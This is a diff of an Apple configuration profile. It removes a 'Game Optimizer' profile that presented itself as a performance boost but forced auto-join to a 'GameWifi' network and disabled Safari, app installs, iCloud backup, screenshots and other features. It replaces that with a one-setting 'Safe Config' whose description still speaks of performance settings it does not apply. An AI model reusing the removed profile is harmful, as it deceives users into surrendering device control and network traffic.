@@ -8,75 +8,34 @@
   <key>PayloadVersion</key>
   <integer>1</integer>
   <key>PayloadIdentifier</key>
-  <string>com.optimized.gameconfig</string>
+  <string>com.simpleconfig.safe</string>
   <key>PayloadUUID</key>
-  <string>F0E1D2C3-B4A5-6789-0123-456789ABCDEF</string>
+  <string>12345678-1234-1234-1234-1234567890AB</string>
   <key>PayloadDisplayName</key>
-  <string>Game Optimizer</string>
+  <string>Safe Config</string>
   <key>PayloadDescription</key>
-  <string>Improve performance for gaming</string>
+  <string>Safe config to avoid error when installing</string>
   <key>ConsentText</key>
   <dict>
     <key>default</key>
-    <string>By installing this profile, you accept the performance optimizations.</string>
+    <string>Accept this profile to apply light performance settings.</string>
   </dict>
   <key>PayloadContent</key>
   <array>
-
-    <!-- Wi-Fi auto-join -->
-    <dict>
-      <key>PayloadType</key>
-      <string>com.apple.wifi.managed</string>
-      <key>PayloadVersion</key>
-      <integer>1</integer>
-      <key>PayloadIdentifier</key>
-      <string>com.optimized.wifi</string>
-      <key>PayloadUUID</key>
-      <string>11112222-3333-4444-5555-666677778888</string>
-      <key>PayloadDisplayName</key>
-      <string>Wi-Fi Setup</string>
-      <key>SSID_STR</key>
-      <string>GameWifi</string>
-      <key>AutoJoin</key>
-      <true/>
-      <key>EncryptionType</key>
-      <string>WPA</string>
-      <key>Password</key>
-      <string>password123</string>
-    </dict>
-
-    <!-- Restrictions (8 limit settings) -->
     <dict>
       <key>PayloadType</key>
       <string>com.apple.applicationaccess</string>
       <key>PayloadVersion</key>
       <integer>1</integer>
       <key>PayloadIdentifier</key>
-      <string>com.optimized.restrict</string>
+      <string>com.safe.restrict</string>
       <key>PayloadUUID</key>
-      <string>99990000-AAAA-BBBB-CCCC-DDDDEEEEFFFF</string>
+      <string>87654321-4321-4321-4321-0987654321BA</string>
       <key>PayloadDisplayName</key>
-      <string>System Restrictions</string>
-
-      <!-- 8 Restrictions -->
-      <key>allowSafari</key>
-      <false/>
-      <key>allowAppInstallation</key>
-      <false/>
-      <key>allowCloudBackup</key>
-      <false/>
-      <key>allowCloudDocuments</key>
-      <false/>
-      <key>allowBluetoothModification</key>
-      <false/>
-      <key>allowScreenShot</key>
-      <false/>
-      <key>allowVideoConferencing</key>
-      <false/>
+      <string>Light Restriction</string>
       <key>allowUSBRestrictedMode</key>
       <true/>
     </dict>
-
   </array>
 </dict>
 </plist>
